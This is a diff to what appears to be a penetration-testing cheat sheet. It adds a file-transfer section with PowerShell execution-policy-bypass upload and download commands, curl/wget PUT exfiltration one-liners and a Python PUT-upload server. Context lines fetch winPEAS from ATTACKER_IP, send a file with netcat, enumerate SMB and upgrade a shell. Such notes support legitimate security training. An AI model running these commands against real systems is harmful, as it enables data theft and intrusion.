@@ -17,7 +17,8 @@ nc -w 3 [destination] 1234 < out.file
 #### ftp
 
 <pre><code>sudo pip3 install pyftpdlib
-<strong>sudo python3 -m pyftpdlib -w -p 21</strong></code></pre>
+<strong>sudo python3 -m pyftpdlib -w -p 21
+</strong></code></pre>
 
 non-interactive on windows
 
@@ -34,12 +35,101 @@ echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 ```
 
-windows
+windows download
 
 ```
 powershell -command "invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat"
 invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat
 ```
+
+#### httpsrv.py
+
+```
+Windows upload & download
+    powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.UploadFile('http://target.com/upload.bin', 'PUT', 'c:\\upload.bin');"
+    powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.DownloadFile('http://target.com/download.bin','c:\\download.bin');"
+
+Linux upload & download
+    curl -X PUT --upload-file upload.bin http://target.com/upload.bin
+    wget -O- --method=PUT --body-file=upload.bin http://target.com/upload.bin
+    wget http://target.com/download.bin -O /tmp/download.bin
+    curl http://target.com/download.bin -o /tmp/download.bin
+```
+
+<details>
+
+<summary>httpsrv.py</summary>
+
+```
+#!/usr/bin/env python3
+
+"""Extend Python's built in HTTP server to save files
+
+Windows upload & download
+    powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.UploadFile('http://target.com/upload.bin', 'PUT', 'c:\\upload.bin');"
+    powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.DownloadFile('http://target.com/download.bin','c:\\download.bin');"
+
+Linux upload & download
+    curl -X PUT --upload-file upload.bin http://target.com/upload.bin
+    wget -O- --method=PUT --body-file=upload.bin http://target.com/upload.bin
+    wget http://target.com/download.bin -O /tmp/download.bin
+    curl http://target.com/download.bin -o /tmp/download.bin
+"""
+import os
+import argparse
+try:
+    import http.server as server
+except ImportError:
+    # Handle Python 2.x
+    import SimpleHTTPServer as server
+
+class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
+    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
+    def do_PUT(self):
+        """Save a file following a HTTP PUT request"""
+        filename = os.path.basename(self.path)
+
+        # Don't overwrite files
+        if os.path.exists(filename):
+            self.send_response(409, 'Conflict')
+            self.end_headers()
+            reply_body = '"%s" already exists\n' % filename
+            self.wfile.write(reply_body.encode('utf-8'))
+            return
+
+        file_length = int(self.headers['Content-Length'])
+        read = 0
+        with open(filename, 'wb+') as output_file:
+            while read < file_length:
+                new_read = self.rfile.read(min(66556, file_length - read))
+                read += len(new_read)
+                output_file.write(new_read)
+        self.send_response(201, 'Created')
+        self.end_headers()
+        reply_body = 'Saved "%s"\n' % filename
+        self.wfile.write(reply_body.encode('utf-8'))
+
+    def do_GET(self):
+        self.send_response(404, 'Not Found')
+        self.end_headers()
+        self.wfile.write(b'')
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--bind', '-b', default='', metavar='ADDRESS',
+                        help='Specify alternate bind address '
+                             '[default: all interfaces]')
+    parser.add_argument('port', action='store',
+                        default=8000, type=int,
+                        nargs='?',
+                        help='Specify alternate port [default: 8000]')
+    args = parser.parse_args()
+
+    server.test(HandlerClass=HTTPRequestHandler, port=args.port, bind=args.bind)
+```
+
+</details>
 
 ## Enumeration
 
@@ -125,7 +215,8 @@ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.170.159
 ```
 
 <pre><code>for ip in $(cat smb_ips.txt); do enum4linux -a $ip; done
-<strong>smbclient -U alfred -L //192.168.177.13/files</strong></code></pre>
+<strong>smbclient -U alfred -L //192.168.177.13/files
+</strong></code></pre>
 
 ### NFS Enumeration&#x20;
 
@@ -1097,7 +1188,8 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 <strong>stty raw -echo
 </strong>fg
 # Enter, Enter
-export TERM=xterm-256-color</code></pre>
+export TERM=xterm-256-color
+</code></pre>
 
 msfvenom : generate reverse shell #todo
 
